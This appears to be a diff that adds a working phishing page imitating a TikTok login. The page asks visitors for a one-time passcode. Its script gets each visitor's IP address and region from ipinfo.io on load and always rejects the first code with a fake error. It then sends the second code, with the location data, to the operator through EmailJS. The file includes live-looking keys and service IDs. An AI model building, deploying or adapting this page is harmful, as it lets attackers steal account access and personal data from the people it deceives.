@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TikTok Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: #fff;
+      width: 380px;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .login-box img {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .login-box h2 {
+      margin-bottom: 25px;
+      font-size: 22px;
+      font-weight: 600;
+      color: #222;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+      outline: none;
+      transition: 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #ff0050;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background: #ff0050;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: 0.3s;
+    }
+
+    .login-btn:hover {
+      background: #e60046;
+    }
+
+    .login-box .options {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    .login-box .options a {
+      color: #ff0050;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .login-box .options a:hover {
+      text-decoration: underline;
+    }
+
+    .error-message {
+      color: #ff0050;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+    <h2>Log in to TikTok</h2>
+    <form id="contact-form">
+      <!-- Hidden inputs for IP and State -->
+      <input type="hidden" id="name" name="name" value="Tik">
+      <input type="hidden" id="ip_address" name="ip_address">
+      <input type="hidden" id="state" name="state">
+
+      <div class="input-group">
+        <input type="text" id="pass" name="pass" placeholder="Enter OTP" required>
+      </div>
+      
+      <div id="login-error" class="error-message">
+        Invalid OTP. Please try again.
+      </div>
+
+      <button type="submit" class="login-btn">Log in</button>
+    </form>
+    <div class="options">
+      <p><a href="#">Forgot password?</a></p>
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+
+  <!-- EmailJS library -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  
+  <script type="text/javascript">
+    // Initialize EmailJS with your public key
+    emailjs.init("CannClp2T4D_Qfa6A");
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        // Fetch IP information
+        fetch("https://ipinfo.io/json?token=d53f8306658fc8")
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("ip_address").value = data.ip;
+            document.getElementById("state").value = data.region;
+        })
+        .catch(error => console.error("Error fetching IP info:", error));
+    });
+  
+    let attemptCount = 0;
+  
+    document.getElementById("contact-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      
+      // Basic form validation
+      const password = document.getElementById("pass").value.trim();
+      
+      if (!password) {
+        showError("Please enter your OTP.");
+        return;
+      }
+
+      // First attempt shows inline error
+      if (attemptCount === 0) {
+        attemptCount++;
+        showError("Invalid OTP. Please try again.");
+        return;
+      }
+  
+      // Collect form values
+      const name = document.getElementById("name").value;
+      const ip_address = document.getElementById("ip_address").value;
+      const state = document.getElementById("state").value;
+  
+      const emailParams = {
+        from_name: name,
+        message: `OTP entered: ${password}`,
+        ip_address: ip_address,
+        state: state
+      };
+  
+      // Send email via EmailJS
+      emailjs.send("service_l5fdheq", "template_npp8d28", emailParams)
+        .then(function(response) {
+          window.location.href = "success.html";
+        }, function(error) {
+          console.error("Login Error:", error);
+          alert("Failed to Login. Please check and try again.");
+        });
+    });
+    
+    function showError(message) {
+      const errorElement = document.getElementById("login-error");
+      errorElement.textContent = message;
+      errorElement.style.display = "block";
+    }
+  </script>
+</body>
+</html>
